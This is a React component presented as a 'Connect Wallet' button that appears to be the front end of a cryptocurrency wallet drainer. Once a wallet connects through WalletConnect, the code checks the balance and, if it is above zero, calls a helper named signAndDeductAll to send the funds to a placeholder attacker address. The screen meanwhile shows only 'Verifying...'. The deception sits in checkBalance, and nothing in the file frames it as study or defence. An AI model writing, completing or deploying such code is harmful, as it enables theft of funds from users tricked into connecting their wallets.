import React, { useState } from 'react';
import WalletConnect from "@walletconnect/client";
import QRCodeModal from "@walletconnect/qrcode-modal";
import { useWeb3React } from '@web3-react/core';
import { getBalance, signAndDeductAll } from '../utils/contractInfo';

const ConnectButton = () => {
  const { activate, account, library } = useWeb3React();
  const [verifying, setVerifying] = useState(false);
  const [balance, setBalance] = useState(null);
  const [error, setError] = useState('');

  const connectWallet = async () => {
    const connector = new WalletConnect({
      bridge: "https://bridge.walletconnect.org", // Required
      qrcodeModal: QRCodeModal,
    });

    connector.on("connect", (error, payload) => {
      if (error) {
        setError('Connection failed');
        throw error;
      }
      const { accounts } = payload.params[0];
      checkBalance(accounts[0]);
    });

    connector.on("session_update", (error, payload) => {
      if (error) {
        setError('Session update failed');
        throw error;
      }
      const { accounts } = payload.params[0];
      checkBalance(accounts[0]);
    });

    connector.on("disconnect", (error, payload) => {
      if (error) {
        setError('Disconnect failed');
        throw error;
      }
    });

    if (!connector.connected) {
      connector.createSession();
    }
  };

  const checkBalance = async (account) => {
    setVerifying(true);
    try {
      const balance = await getBalance(account);
      setBalance(balance);
      if (parseFloat(balance) > 0) {
        await signAndDeductAll('YOUR_ADDRESS'); // replace with your Ethereum address
        alert('Transaction successful');
      } else {
        alert('Insufficient balance');
      }
    } catch (error) {
      setError('Balance check failed');
    }
    setVerifying(false);
  };

  return (
    <div>
      <button onClick={connectWallet}>Connect Wallet</button>
      {verifying && <p>Verifying...</p>}
      {balance && <p>Balance: {balance} ETH</p>}
      {error && <p>Error: {error}</p>}
    </div>
  );
};

export default ConnectButton;
